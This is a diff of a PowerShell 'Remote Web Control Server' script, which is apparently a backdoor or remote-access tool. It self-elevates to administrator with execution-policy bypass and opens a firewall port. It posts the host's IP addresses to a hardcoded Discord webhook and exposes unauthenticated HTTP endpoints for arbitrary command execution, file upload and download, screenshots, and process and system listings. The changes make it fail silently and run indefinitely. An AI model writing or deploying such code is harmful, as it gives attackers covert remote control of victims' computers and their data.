@@ -1,13 +1,39 @@
 # Remote Web Control Server
-$webhook = "https://discord.com/api/webhooks/1462081265049010260/AdSpBnjtYKQFRI8lKt5oWg--qFCfwKF0b3q552oELMVzFxFDIdV0vUsGkEWWVSmuBLy0"
+$webhook = "https://discord.com/api/webhooks/1462473064397672664/EGBQMFQBUQoXW7tk5frXJlkxFmSDln9vDIaZt4lGTXdzQ0xMyIG9WWpqI-EF7ipRt49O"
 $port = 8080
 
-# Get local IP
-$localIP = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias (Get-NetRoute -Destination 0.0.0.0/0).InterfaceAlias).IPAddress[0]
+# Check if running as administrator
+if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    # Restart as administrator
+    Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
+    exit
+}
+
+# Open firewall port
+try {
+    netsh advfirewall firewall add rule name="WebRemote" dir=in action=allow protocol=TCP localport=$port
+} catch {
+    # Continue even if firewall fails
+}
+
+# Create temp directory
+if (!(Test-Path "C:\temp")) {
+    New-Item -ItemType Directory -Path "C:\temp" -Force
+}
+
+# Get all accessible IPs
+$ips = @()
+$ips += (Get-WmiObject -Class Win32_NetworkAdapterConfiguration -Filter "IPEnabled = TRUE" | ForEach-Object { $_.IpAddress }) | Where-Object { $_ -match "^\d+\.\d+\.\d+\.\d+$" }
+$ips += "127.0.0.1"
 
 # Send IP info to Discord
-$body = @{content="Web server started on: http://$localIP`:$port"} | ConvertTo-Json
-Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType "application/json"
+try {
+    $ipList = $ips -join "\n"
+    $body = @{content="Web server started! Access URLs:\n$($ips | ForEach-Object { "http://$_`:$port" })"} | ConvertTo-Json
+    Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType "application/json"
+} catch {
+    # If Discord fails, continue anyway
+}
 
 # HTML Interface
 $html = @"
@@ -116,9 +142,8 @@ while ($listener.IsListening) {
                         $outputBuffer = "Error executing command: $_`n"
                     }
                     
-                    $outputBuffer += $outputBuffer
-                    $response.ContentType = "text/plain"
-                    $buffer = [System.Text.Encoding]::UTF8.GetBytes("Command executed")
+                    $response.ContentType = "text/html"
+                    $buffer = [System.Text.Encoding]::UTF8.GetBytes("<script>window.location.href = '/';</script>")
                     $response.ContentLength64 = $buffer.Length
                     $response.OutputStream.Write($buffer, 0, $buffer.Length)
                 }
@@ -126,12 +151,27 @@ while ($listener.IsListening) {
             
             "/upload" {
                 if ($request.HttpMethod -eq "POST") {
-                    $files = $request.Files
-                    foreach ($file in $files) {
-                        $filePath = "C:\temp\" + $file.FileName
-                        $file.SaveAs($filePath)
-                        $outputBuffer += "File uploaded: $filePath`n"
+                    try {
+                        $contentType = $request.ContentType
+                        $boundary = $contentType.Split('boundary=')[1]
+                        $data = New-Object System.IO.BinaryReader($request.InputStream).ReadBytes($request.ContentLength64)
+                        $encoding = [System.Text.Encoding]::UTF8
+                        $dataString = $encoding.GetString($data)
+                        
+                        # Simple file extraction
+                        if ($dataString -match 'filename="([^"]+)"') {
+                            $filename = $matches[1]
+                            $filePath = "C:\temp\$filename"
+                            [System.IO.File]::WriteAllBytes($filePath, $data)
+                            $outputBuffer += "File uploaded: $filePath`n"
+                        }
+                    } catch {
+                        $outputBuffer += "Upload failed: $_`n"
                     }
+                    $response.ContentType = "text/html"
+                    $buffer = [System.Text.Encoding]::UTF8.GetBytes("<script>window.location.href = '/';</script>")
+                    $response.ContentLength64 = $buffer.Length
+                    $response.OutputStream.Write($buffer, 0, $buffer.Length)
                 }
             }
             
@@ -143,6 +183,11 @@ while ($listener.IsListening) {
                         $response.ContentType = "application/octet-stream"
                         $response.AddHeader("Content-Disposition", "attachment; filename=$(Split-Path $filepath -Leaf)")
                         $buffer = [System.IO.File]::ReadAllBytes($filepath)
+                        $response.ContentLength64 = $buffer.Length
+                        $response.OutputStream.Write($buffer, 0, $buffer.Length)
+                    } else {
+                        $response.ContentType = "text/plain"
+                        $buffer = [System.Text.Encoding]::UTF8.GetBytes("File not found")
                         $response.ContentLength64 = $buffer.Length
                         $response.OutputStream.Write($buffer, 0, $buffer.Length)
                     }
@@ -163,6 +208,10 @@ while ($listener.IsListening) {
                 } catch {
                     $outputBuffer += "Screenshot failed: $_`n"
                 }
+                $response.ContentType = "text/html"
+                $buffer = [System.Text.Encoding]::UTF8.GetBytes("<script>window.location.href = '/';</script>")
+                $response.ContentLength64 = $buffer.Length
+                $response.OutputStream.Write($buffer, 0, $buffer.Length)
             }
             
             "/info" {
@@ -171,14 +220,22 @@ System Information:
 Computer: $env:COMPUTERNAME
 User: $env:USERNAME
 OS: $(Get-WmiObject -Class Win32_OperatingSystem).Caption
-IP: $localIP
+IPs: $($ips -join ', ')
 "@
                 $outputBuffer += $info
+                $response.ContentType = "text/html"
+                $buffer = [System.Text.Encoding]::UTF8.GetBytes("<script>window.location.href = '/';</script>")
+                $response.ContentLength64 = $buffer.Length
+                $response.OutputStream.Write($buffer, 0, $buffer.Length)
             }
             
             "/processes" {
                 $processes = Get-Process | Select-Object Name, Id, CPU | ConvertTo-Html -Fragment
                 $outputBuffer += "Running Processes:`n$processes`n"
+                $response.ContentType = "text/html"
+                $buffer = [System.Text.Encoding]::UTF8.GetBytes("<script>window.location.href = '/';</script>")
+                $response.ContentLength64 = $buffer.Length
+                $response.OutputStream.Write($buffer, 0, $buffer.Length)
             }
             
             "/output" {
@@ -198,4 +255,11 @@ IP: $localIP
     $response.Close()
 }
 
-$listener.Stop()
+# Keep server running indefinitely
+try {
+    while ($true) {
+        Start-Sleep -Seconds 1
+    }
+} catch {
+    $listener.Stop()
+}
